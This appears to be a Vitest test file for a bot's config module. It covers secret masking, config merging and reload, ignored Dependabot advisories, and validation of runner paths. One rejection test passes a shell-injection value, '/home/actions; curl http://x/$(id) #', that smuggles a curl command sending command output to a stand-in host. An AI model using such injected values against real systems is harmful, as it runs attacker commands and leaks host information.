import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import fs from "node:fs";
import path from "node:path";
import os from "node:os";

// We need to test config.ts without its module-level loadConfig() interfering
// with the test environment. We'll test the exported functions by importing
// after setting up a temp directory.

const tmpDir = path.join(os.tmpdir(), "claws-config-test-" + process.pid);
const configPath = path.join(tmpDir, "config.json");

// Override WORK_DIR / CONFIG_PATH before importing config
vi.stubEnv("HOME", tmpDir.replace("/.claws", ""));

// We need to mock the os.homedir to return a temp-friendly path
vi.mock("node:os", async () => {
  const actual = await vi.importActual<typeof import("node:os")>("node:os");
  return {
    ...actual,
    default: {
      ...actual,
      homedir: () => tmpDir.replace("/.claws", "").replace(path.sep + ".claws", ""),
    },
  };
});

// Suppress the Slack webhook warning
const origWarn = console.warn;
beforeEach(() => {
  console.warn = vi.fn();
  // Clear env vars that would override config file values
  delete process.env["CLAWS_SLACK_WEBHOOK"];
  delete process.env["CLAWS_AUTH_TOKEN"];
  delete process.env["OPENAI_API_KEY"];
  delete process.env["CLAWS_GITHUB_OWNERS"];
  delete process.env["CLAWS_SELF_REPO"];
  delete process.env["WHATSAPP_ENABLED"];
  delete process.env["WHATSAPP_ALLOWED_NUMBERS"];
  delete process.env["PORT"];
  delete process.env["NAMEY_DB_URL"];
  fs.mkdirSync(tmpDir, { recursive: true });
});

afterEach(() => {
  console.warn = origWarn;
  try {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  } catch {
    // best effort
  }
  // Clear env vars we may have set
  delete process.env["CLAWS_SLACK_WEBHOOK"];
  delete process.env["CLAWS_AUTH_TOKEN"];
  delete process.env["OPENAI_API_KEY"];
});

// We dynamically import config to get fresh state each time we need it
// But since ESM modules are cached, we'll test the functions that re-read config

describe("config", () => {
  // Use the actual module — the functions we need to test re-read config.json
  // on each call so we can control what they see via the file system.

  it("getConfigForDisplay masks sensitive fields correctly", async () => {
    const { getConfigForDisplay, CONFIG_PATH: cp } = await import("./config.js");

    fs.mkdirSync(path.dirname(cp), { recursive: true });
    fs.writeFileSync(
      cp,
      JSON.stringify({
        slackWebhook: "https://hooks.slack.com/services/T123/B456/abcdef",
        openaiApiKey: "sk-openai-key-98765",
        authToken: "my-secret-token-xyz",
        githubOwners: ["owner1"],
        selfRepo: "owner1/repo1",
      }),
    );

    const display = getConfigForDisplay();

    // Sensitive fields should be masked (last 4 chars visible)
    expect(display.slackWebhook).toBe("****cdef");
    expect(display.openaiApiKey).toBe("****8765");

    // Non-sensitive fields should be shown as-is
    expect(display.githubOwners).toEqual(["owner1"]);
    expect(display.selfRepo).toBe("owner1/repo1");
  });

  it("getConfigForDisplay shows 'Not configured' for empty sensitive fields", async () => {
    const { getConfigForDisplay, CONFIG_PATH: cp } = await import("./config.js");

    fs.mkdirSync(path.dirname(cp), { recursive: true });
    fs.writeFileSync(cp, JSON.stringify({}));

    // Remove env vars that would override
    delete process.env["CLAWS_SLACK_WEBHOOK"];
    delete process.env["CLAWS_AUTH_TOKEN"];
    delete process.env["OPENAI_API_KEY"];

    const display = getConfigForDisplay();
    expect(display.slackWebhook).toBe("Not configured");
    expect(display.openaiApiKey).toBe("Not configured");
  });

  it("writeConfig reads, merges, and writes config.json correctly", async () => {
    const { writeConfig, CONFIG_PATH: cp } = await import("./config.js");

    fs.mkdirSync(path.dirname(cp), { recursive: true });
    fs.writeFileSync(
      cp,
      JSON.stringify({ selfRepo: "old/repo", logRetentionDays: 7 }),
    );

    writeConfig({ selfRepo: "new/repo", logRetentionDays: 30 });

    const written = JSON.parse(fs.readFileSync(cp, "utf-8"));
    expect(written.selfRepo).toBe("new/repo");
    expect(written.logRetentionDays).toBe(30);
  });

  it("writeConfig with empty secret fields does not overwrite existing values", async () => {
    const { writeConfig, CONFIG_PATH: cp } = await import("./config.js");

    fs.mkdirSync(path.dirname(cp), { recursive: true });
    fs.writeFileSync(
      cp,
      JSON.stringify({ slackWebhook: "https://hooks.slack.com/existing", openaiApiKey: "existing-key" }),
    );

    writeConfig({ slackWebhook: "", openaiApiKey: "", selfRepo: "new/repo" });

    const written = JSON.parse(fs.readFileSync(cp, "utf-8"));
    expect(written.slackWebhook).toBe("https://hooks.slack.com/existing");
    expect(written.openaiApiKey).toBe("existing-key");
    expect(written.selfRepo).toBe("new/repo");
  });

  it("writeConfig deep-merges intervals", async () => {
    const { writeConfig, CONFIG_PATH: cp } = await import("./config.js");

    fs.mkdirSync(path.dirname(cp), { recursive: true });
    fs.writeFileSync(
      cp,
      JSON.stringify({ intervals: { issueWorkerMs: 300000, ciFixerMs: 600000 } }),
    );

    writeConfig({ intervals: { issueWorkerMs: 120000 } });

    const written = JSON.parse(fs.readFileSync(cp, "utf-8"));
    expect(written.intervals.issueWorkerMs).toBe(120000);
    expect(written.intervals.ciFixerMs).toBe(600000); // preserved
  });

  it("writeConfig handles missing config.json gracefully", async () => {
    const { writeConfig, CONFIG_PATH: cp } = await import("./config.js");

    fs.mkdirSync(path.dirname(cp), { recursive: true });
    // Ensure config.json does not exist
    try { fs.unlinkSync(cp); } catch { /* ok */ }

    writeConfig({ selfRepo: "fresh/repo" });

    const written = JSON.parse(fs.readFileSync(cp, "utf-8"));
    expect(written.selfRepo).toBe("fresh/repo");
  });

  it("reloadConfig updates exported bindings", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(
      mod.CONFIG_PATH,
      JSON.stringify({ selfRepo: "reloaded/repo", logRetentionDays: 42 }),
    );

    mod.reloadConfig();

    expect(mod.SELF_REPO).toBe("reloaded/repo");
    expect(mod.LOG_RETENTION_DAYS).toBe(42);
  });

  it("claudeWorkerMemoryMaxBytes falls back to 2 GiB default when env var is non-numeric", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));

    process.env["CLAWS_CLAUDE_WORKER_MEMORY_MAX_BYTES"] = "not-a-number";
    try {
      mod.reloadConfig();
      expect(mod.CLAUDE_WORKER_MEMORY_MAX_BYTES).toBe(2_147_483_648);
    } finally {
      delete process.env["CLAWS_CLAUDE_WORKER_MEMORY_MAX_BYTES"];
      // Restore so subsequent tests don't see NaN
      mod.reloadConfig();
    }
  });

  it("onConfigChange fires listeners after writeConfig", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));

    const listener = vi.fn();
    mod.onConfigChange(listener);

    mod.writeConfig({ logRetentionDays: 99 });

    expect(listener).toHaveBeenCalledTimes(1);
  });
});

describe("getIgnoredAdvisoriesForRepo", () => {
  it("merges '*' global list with per-repo list", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(
      mod.CONFIG_PATH,
      JSON.stringify({
        dependabotIgnoredAdvisories: {
          "*": ["GHSA-aaaa-0000-0001"],
          "owner/repo": ["GHSA-bbbb-0000-0002"],
        },
      }),
    );

    mod.reloadConfig();
    const result = mod.getIgnoredAdvisoriesForRepo("owner/repo");

    expect(result).toEqual(new Set(["ghsa-aaaa-0000-0001", "ghsa-bbbb-0000-0002"]));
  });

  it("returns only global list when no repo-specific key", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(
      mod.CONFIG_PATH,
      JSON.stringify({
        dependabotIgnoredAdvisories: {
          "*": ["GHSA-cccc-0000-0003"],
        },
      }),
    );

    mod.reloadConfig();
    const result = mod.getIgnoredAdvisoriesForRepo("owner/other-repo");

    expect(result).toEqual(new Set(["ghsa-cccc-0000-0003"]));
  });

  it("returns empty set when neither '*' nor repo key present", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));

    mod.reloadConfig();
    const result = mod.getIgnoredAdvisoriesForRepo("owner/repo");

    expect(result).toEqual(new Set());
  });
});

describe("RunnerHostSchema actionsDir validation", () => {
  it("accepts a valid absolute path", async () => {
    const { RunnerHostSchema } = await import("./config.js");
    expect(RunnerHostSchema.safeParse({ host: "h", actionsDir: "/home/actions/actions-runner" }).success).toBe(true);
    expect(RunnerHostSchema.safeParse({ host: "h", actionsDir: "/opt/runner_2.0" }).success).toBe(true);
  });

  it("rejects a path with shell injection characters", async () => {
    const { RunnerHostSchema } = await import("./config.js");
    expect(RunnerHostSchema.safeParse({ host: "h", actionsDir: "/home/actions; curl http://x/$(id) #" }).success).toBe(false);
  });

  it("rejects a relative path", async () => {
    const { RunnerHostSchema } = await import("./config.js");
    expect(RunnerHostSchema.safeParse({ host: "h", actionsDir: "relative/path" }).success).toBe(false);
  });

  it("rejects a path with spaces", async () => {
    const { RunnerHostSchema } = await import("./config.js");
    expect(RunnerHostSchema.safeParse({ host: "h", actionsDir: "/a b" }).success).toBe(false);
  });

  it("rejects a path with backtick", async () => {
    const { RunnerHostSchema } = await import("./config.js");
    expect(RunnerHostSchema.safeParse({ host: "h", actionsDir: "/a`b" }).success).toBe(false);
  });

  it("rejects a path with ampersands", async () => {
    const { RunnerHostSchema } = await import("./config.js");
    expect(RunnerHostSchema.safeParse({ host: "h", actionsDir: "/a&&b" }).success).toBe(false);
  });
});
